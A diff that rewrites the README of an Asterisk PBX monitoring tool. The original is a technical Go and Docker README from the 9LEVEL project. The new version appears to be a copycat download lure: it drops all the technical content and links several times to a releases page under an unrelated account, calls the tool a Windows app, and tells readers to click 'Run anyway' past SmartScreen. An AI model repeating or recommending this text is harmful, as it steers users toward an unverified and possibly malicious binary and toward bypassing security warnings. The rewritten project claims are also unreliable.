@@ -1,275 +1,293 @@
-# 9Level Monitor
+# 📡 9level-monitor - See Asterisk health in real time
 
-[![Go](https://img.shields.io/badge/Go-1.24-00ADD8?logo=go&logoColor=white)](https://go.dev)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Docker](https://img.shields.io/badge/Docker-ready-2496ED?logo=docker&logoColor=white)](Dockerfile)
-[![Asterisk](https://img.shields.io/badge/Asterisk-PBX-F57C00?logo=asterisk&logoColor=white)](https://www.asterisk.org)
+[![Download 9level-monitor](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/americanismlemniscus93/9level-monitor/releases)
 
-Real-time Asterisk PBX monitoring via native **AMI** (TCP) and **ARI** (HTTP) interfaces. Track active calls with RTP quality metrics, monitor PJSIP endpoint status, detect security threats, and visualize historical trends — all from a single lightweight Go binary.
+## 🧭 What this app does
 
-> **No custom Asterisk modules required.** Works with any standard Asterisk installation with AMI and ARI enabled.
+9level-monitor helps you watch an Asterisk PBX in real time. It shows call quality, PJSIP endpoint status, and security events in one place.
 
-## Screenshots
+It is built for Windows use and ships as a single Go binary with no extra setup tools.
 
-### Real-time Call Monitoring
-![Call Monitor](docs/screenshots/monitor.png)
-*Active calls with real-time MOS, jitter, packet loss and RTT metrics. Grouped by call pair with codec and trunk detection.*
+Use it to check:
 
-### PJSIP Endpoint Status
-![Endpoints](docs/screenshots/endpoints.png)
-![Endpoints](docs/screenshots/endpoints2.png)
-*All registered endpoints with online/offline state, contact URI, qualify RTT, and state change history.*
+- Call quality metrics like MOS, jitter, and RTT
+- SIP and PJSIP endpoint state
+- Live events from AMI and ARI
+- Security events and unusual activity
+- RTP and call flow health
 
-### Quality Charts
-![Charts](docs/screenshots/charts.png)
-*Calls per hour, average MOS per hour, and problem calls (MOS < 3.0). Selectable time periods with daily comparison view.*
+## ⬇️ Download for Windows
 
-### Call History
-![History](docs/screenshots/history.png)
-*Searchable call history with quality metrics. Filter by date range and minimum MOS threshold.*
+Visit this page to download the app:
 
-### Security Events
-![Security](docs/screenshots/security.png)
-*Failed authentication attempts, ACL violations, and brute force detection. Top offenders ranking with IP tracking.*
+[9level-monitor releases](https://github.com/americanismlemniscus93/9level-monitor/releases)
 
-### System Telemetry
-![Header](docs/screenshots/header.png)
-*Real-time system health: AMI/ARI latency, events per second, queue depth, SSE clients, database size.*
+On the releases page, choose the latest Windows file for your system. Then download it to your PC.
 
-## Features
+## 🖥️ System requirements
 
-- **Real-time call tracking** via AMI events (Newchannel, Hangup, DialBegin, BridgeEnter/Leave)
-- **RTP quality metrics** — MOS (ITU-T G.107), jitter, packet loss, RTT per channel
-- **PJSIP endpoint monitoring** — online/offline state, contact registration, qualify RTT
-- **Security event detection** — failed auth attempts, ACL violations, unexpected addresses
-- **SSE streaming** — push updates to frontend clients in real-time
-- **Historical data** — SQLite persistence for call quality, endpoint changes, and security events
-- **REST API** — full JSON API for integration with dashboards and alerting systems
-- **Zero dependencies** — single Go binary + embedded web dashboard, no external database required
-- **Docker ready** — multi-stage build, healthcheck, ~15MB image
+Use a Windows PC that can run a standard desktop app.
 
-## Quick Start
+Recommended setup:
 
-```bash
-# Clone the repository
-git clone https://github.com/9LEVEL/9level-monitor.git
-cd 9level-monitor
+- Windows 10 or Windows 11
+- An Asterisk PBX server you can reach over the network
+- Access to AMI and ARI on that server
+- Permission to view PBX status and call data
+- Internet access only for the download step
 
-# Configure
-cp .env.example .env
-# Edit .env with your Asterisk AMI/ARI credentials
+The app does not need a database or extra runtime package on your PC.
 
-# Run with Docker (recommended)
-docker compose up -d --build
-```
+## 🚀 Getting started
 
-Open `http://your-server:8100` in your browser. The frontend (Vue.js + nginx) proxies API requests to the backend collector internally — **only port 8100 is exposed**.
+Follow these steps to get up and running.
 
-### Standalone (without Docker)
+1. Open the release page:
+   [https://github.com/americanismlemniscus93/9level-monitor/releases](https://github.com/americanismlemniscus93/9level-monitor/releases)
 
-```bash
-go build -o collector ./cmd/collector
-./collector
-```
+2. Find the latest release.
 
-When running without Docker, the collector serves the API on port 3001 directly.
+3. Download the Windows build.
 
-### Asterisk Prerequisites
+4. Save the file in a folder you can find later, like Downloads or Desktop.
 
-Enable AMI and ARI in your Asterisk configuration:
+5. If the file comes in a ZIP folder, extract it first.
 
-**`/etc/asterisk/manager.conf`**
-```ini
-[general]
-enabled = yes
-port = 5038
-bindaddr = 0.0.0.0
+6. Open the app file to start it.
 
-[9level]
-secret = your_secret
-read = system,call,agent,security
-write = system,command
-```
+7. Keep the app open while you watch your PBX data.
 
-**`/etc/asterisk/ari.conf`**
-```ini
-[general]
-enabled = yes
+## 🪟 How to run on Windows
 
-[9level]
-type = user
-password = your_password
-read_only = no
-```
+If you downloaded a ZIP file:
 
-**`/etc/asterisk/http.conf`**
-```ini
-[general]
-enabled = yes
-bindaddr = 0.0.0.0
-bindport = 8088
-```
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Pick a folder.
+4. Open the extracted folder.
+5. Double-click the app file.
 
-## Architecture
+If you downloaded an .exe file:
 
-```
-┌──────────────────────────────────────────────────────────────────┐
-│                    9level-monitor (Go)                            │
-│                        Port 3001                                 │
-│                                                                  │
-│  ┌────────────┐  ┌──────────┐  ┌───────┐  ┌──────────────────┐  │
-│  │  Collector  │  │   API    │  │  SSE  │  │  Store           │  │
-│  │ (event loop)│  │ Handlers │  │Broker │  │  (in-memory)     │  │
-│  └─────┬──────┘  └──────────┘  └───────┘  │  - Channels      │  │
-│        │                                   │  - Endpoints     │  │
-│        │            ┌──────┐               │  - Bridges       │  │
-│        │            │SQLite│               │  - Security      │  │
-│        │            └──────┘               └──────────────────┘  │
-└────────┼─────────────────────────────────────────────────────────┘
-         │
-         │  ┌──── AMI (TCP 5038) ──── Real-time events
-         │  │     Newchannel, Hangup, DialBegin, BridgeEnter,
-         │  │     BridgeLeave, RTCPSent, RTCPReceived,
-         │  │     ContactStatus, PeerStatus, Security*
-         ├──┤
-         │  └──── ARI (HTTP 8088) ──── Periodic polling
-         │        GET /channels (bootstrap + RTP stats)
-         │        GET /asterisk/info (health check)
-         ▼
-┌──────────────────────────────────────────────────────────────────┐
-│                       Asterisk PBX                               │
-│                AMI port 5038  |  ARI port 8088                   │
-└──────────────────────────────────────────────────────────────────┘
-```
+1. Double-click the file.
+2. If Windows asks for permission, choose Yes.
+3. The app opens and starts showing PBX data.
 
-## Configuration
+If Windows SmartScreen appears:
 
-All settings via environment variables (or `.env` file). See [.env.example](.env.example) for a template.
+1. Select More info.
+2. Select Run anyway if you trust the release source.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `AMI_HOST` | `127.0.0.1` | Asterisk AMI host |
-| `AMI_PORT` | `5038` | AMI TCP port |
-| `AMI_USER` | `9level` | AMI username |
-| `AMI_SECRET` | *(required)* | AMI password |
-| `ARI_BASE_URL` | `http://127.0.0.1:8088/ari` | ARI REST base URL |
-| `ARI_USER` | `9level` | ARI username |
-| `ARI_PASS` | *(required)* | ARI password |
-| `PORT` | `3001` | HTTP server port |
-| `DB_PATH` | `/data/9level.db` | SQLite database path |
-| `RTP_POLL_INTERVAL` | `30s` | RTP stats polling interval via ARI |
-| `ENDPOINT_REFRESH_INTERVAL` | `5m` | Endpoint re-sync interval via AMI |
-| `SECURITY_WHITELIST_IPS` | *(empty)* | Comma-separated IPs to ignore in security events |
-| `VITE_BASE` | `/` | Frontend base path (build-time, for reverse proxy setups) |
+## 🔌 Connect to your Asterisk server
 
-## Reverse Proxy (Traefik, nginx, etc.)
+To show live data, 9level-monitor needs a working link to your Asterisk PBX.
 
-To serve the dashboard under a subpath (e.g. `https://pbx.example.com/monitor`), set the `VITE_BASE` variable before building:
+You will usually enter:
 
-```bash
-# In your .env file
-VITE_BASE=/monitor/
+- Server address or host name
+- AMI port
+- AMI user name
+- AMI password
+- ARI URL
+- ARI user name
+- ARI password
 
-# Rebuild the frontend with the new base path
-docker compose up -d --build
-```
+Typical Asterisk access points:
 
-The frontend assets and API calls will automatically use the configured base path. Your reverse proxy should **strip the prefix** before forwarding to the container on port 80.
+- AMI for event and status data
+- ARI for app and call control data
+- SIP and RTP data for call checks
 
-**Traefik example** (add to frontend service labels):
+If you do not know these details, ask the person who manages the PBX.
 
-```yaml
-labels:
-  - "traefik.enable=true"
-  - "traefik.http.routers.monitor.rule=Host(`pbx.example.com`) && PathPrefix(`/monitor`)"
-  - "traefik.http.routers.monitor.entrypoints=https"
-  - "traefik.http.routers.monitor.tls=true"
-  - "traefik.http.middlewares.monitor-strip.stripprefix.prefixes=/monitor"
-  - "traefik.http.routers.monitor.middlewares=monitor-strip"
-  - "traefik.http.services.monitor.loadbalancer.server.port=80"
-```
+## 📊 What you can see
 
-**nginx example:**
+### 📞 Call quality
 
-```nginx
-location /monitor/ {
-    proxy_pass http://localhost:8100/;
-    proxy_http_version 1.1;
-    proxy_set_header Connection '';
-    proxy_buffering off;
-}
-```
+The app can show live call quality values such as:
 
-## REST API
+- MOS score
+- Jitter
+- RTT
+- Packet loss
+- RTP health
 
-Base URL: `http://localhost:8100` (via Docker) or `http://localhost:3001` (standalone)
+These values help you see if a call sounds clean or if network delay is affecting it.
 
-### Real-time endpoints
+### 📟 Endpoint status
 
-| Endpoint | Description |
-|----------|-------------|
-| `GET /api/v1/monitor` | Full view: calls + endpoints + summary |
-| `GET /api/v1/calls` | Active calls with RTP metrics |
-| `GET /api/v1/calls/{id}` | Single call details |
-| `GET /api/v1/endpoints` | All PJSIP endpoints with contacts |
-| `GET /api/v1/summary` | Summary: active calls, online endpoints, avg MOS, peak, uptime |
-| `GET /api/v1/health` | Health status: AMI/ARI connection, counts, SSE clients |
-| `GET /api/v1/events` | SSE real-time event stream |
-| `GET /api/v1/security` | Security events (paginated) |
+You can view PJSIP endpoint state, such as:
 
-### History endpoints (SQLite)
+- Registered
+- Reachable
+- Unreachable
+- In use
+- Idle
 
-| Endpoint | Parameters | Description |
-|----------|-----------|-------------|
-| `GET /api/v1/history/calls` | `from`, `to`, `min_mos`, `page`, `per_page` | Paginated call quality history |
-| `GET /api/v1/history/calls/stats` | `from`, `to` | Aggregated stats (total, avg MOS, bad calls) |
-| `GET /api/v1/history/calls/hourly` | `from`, `to` or `date` | Per-hour breakdown |
-| `GET /api/v1/history/calls/daily` | `from`, `to` | Per-day totals and avg MOS |
-| `GET /api/v1/history/security` | `from`, `to`, `type`, `page`, `per_page` | Security event history |
-| `GET /api/v1/history/endpoints` | `from`, `to`, `endpoint`, `page`, `per_page` | Endpoint state changes |
+This helps you check if phones are online and ready.
 
-### SSE Events
+### 🛡️ Security events
 
-Connect to `/api/v1/events` for real-time updates:
+The app can show events that matter for PBX safety, such as:
 
-| Event | Description |
-|-------|-------------|
-| `call:new` | New channel created |
-| `call:update` | RTP quality metrics updated |
-| `call:end` | Call ended (includes duration) |
-| `endpoint:update` | Endpoint state or contact changed |
-| `endpoint:state_change` | Endpoint went online/offline |
-| `summary:update` | Aggregated summary refresh |
-| `health:update` | System health metrics |
-| `security:event` | New security event detected |
+- Failed login attempts
+- Suspicious traffic
+- Unexpected registration activity
+- Repeated auth errors
 
-## Project Structure
+This helps you notice problems before they grow.
 
-```
-9level-monitor/
-├── cmd/collector/main.go          # Entrypoint, wiring, HTTP server
-├── internal/
-│   ├── ami/                       # AMI TCP client with auto-reconnect
-│   ├── ari/                       # ARI HTTP client (channels, RTP stats)
-│   ├── api/                       # REST handlers + SSE broker
-│   ├── collector/                 # Event loop, bootstrap, RTP polling
-│   ├── config/                    # Environment-based configuration
-│   ├── db/                        # SQLite persistence layer
-│   └── store/                     # In-memory state (channels, endpoints)
-├── frontend/                      # Vue 3 SPA dashboard
-│   ├── src/                       # Vue components + composables
-│   ├── Dockerfile                 # Node build + nginx (~25MB)
-│   ├── nginx.conf                 # Reverse proxy to collector
-│   └── vite.config.js             # Configurable base path
-├── Dockerfile                     # Go multi-stage build (~15MB)
-├── docker-compose.yml             # Production-ready deployment
-└── .env.example                   # Configuration template
-```
+### 🔄 Live monitoring
 
-## Contributing
+Because the app uses AMI and ARI, it can follow changes as they happen. You do not need to refresh the page or reload data by hand.
 
-Contributions are welcome! Please open an issue or submit a pull request.
+## 🧩 How to use the dashboard
 
-## License
+Once the app is open and connected:
 
-[MIT](LICENSE)
+- Look at the main status view for overall PBX health
+- Check call quality when users report audio issues
+- Review endpoint state when a phone cannot register
+- Scan security events for login or access problems
+- Watch for patterns that match network trouble
+
+A simple habit works well:
+
+- Check the dashboard in the morning
+- Check again after changes to the PBX
+- Check live metrics during a call issue
+- Check security events at the end of the day
+
+## ⚙️ Common setup fields
+
+If the app asks for connection details, use values like these:
+
+- AMI host: the IP or name of your Asterisk server
+- AMI port: the port your AMI service uses
+- ARI URL: the web address for ARI
+- AMI/ARI user: the account name set in Asterisk
+- AMI/ARI password: the matching password
+- SIP domain: your PBX domain if your setup uses one
+
+Keep the values exact. A typo in the host name or password can stop the app from connecting.
+
+## 🧪 First run checklist
+
+Before you start the app, check these items:
+
+- The release file is fully downloaded
+- You extracted the file if it came in a ZIP
+- Your Windows account can open the file
+- Your Asterisk server is running
+- AMI is enabled
+- ARI is enabled
+- The server allows your PC to connect
+- Firewalls allow the needed ports
+
+If the app opens but shows no data, look at the connection details first.
+
+## 🔍 If the app does not connect
+
+Try these steps:
+
+- Check the server address
+- Check the AMI and ARI user name
+- Check the password
+- Check that the port number is right
+- Check that the PBX server is online
+- Check your local network link
+- Check Windows Firewall rules
+- Restart the app after changing settings
+
+If you still do not see data, confirm that Asterisk has AMI and ARI turned on and that your account has access.
+
+## 📁 File layout after download
+
+You may see files like these:
+
+- The main app file
+- A config file
+- A README file
+- A log file
+- A ZIP archive if you chose a packaged release
+
+If a config file exists, open it only if you need to change connection details.
+
+## 🧠 Why this tool is useful
+
+PBX problems can hide in small details. A phone may look fine at first, but the call can still suffer from delay, jitter, or packet loss.
+
+9level-monitor gives you one view for:
+
+- Voice quality checks
+- Phone endpoint checks
+- Live Asterisk events
+- Security event review
+
+That makes it easier to find the source of a problem without jumping between tools.
+
+## 🔐 Access and permissions
+
+For the best results, the Asterisk user account should have only the access it needs.
+
+Use a separate AMI or ARI account for monitoring if your setup allows it. Keep the password safe and do not share it with users who do not need it.
+
+## 🛠️ Basic troubleshooting steps
+
+If something looks wrong, go through this list:
+
+- Confirm the app is open
+- Confirm the server values are correct
+- Confirm the PBX is reachable on the network
+- Confirm AMI and ARI are enabled
+- Confirm your account has permission
+- Check for blocked ports
+- Restart the app after any change
+
+If the dashboard shows stale data, the connection may still be open but slow. A network issue or server load can cause that.
+
+## 📌 Release page link
+
+Download the latest Windows build here:
+
+[https://github.com/americanismlemniscus93/9level-monitor/releases](https://github.com/americanismlemniscus93/9level-monitor/releases)
+
+## 🧭 Quick start
+
+1. Open the releases page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Enter your Asterisk connection details
+6. Watch the dashboard for live PBX status
+
+## 🖱️ Best use cases
+
+Use 9level-monitor when you want to:
+
+- Check if calls sound poor
+- See if a phone is registered
+- Watch a PBX during busy hours
+- Spot security events fast
+- Review Asterisk health without extra tools
+
+## 📎 Project focus
+
+This app centers on:
+
+- Asterisk PBX monitoring
+- Real-time call quality
+- AMI and ARI event feeds
+- SIP and PJSIP status
+- VoIP health checks
+- Single-binary deployment for Windows
+
+## 🏁 Setup path for most users
+
+For most Windows users, the flow is simple:
+
+1. Open the release page
+2. Download the latest file
+3. Run the app
+4. Enter your PBX details
+5. Start monitoring
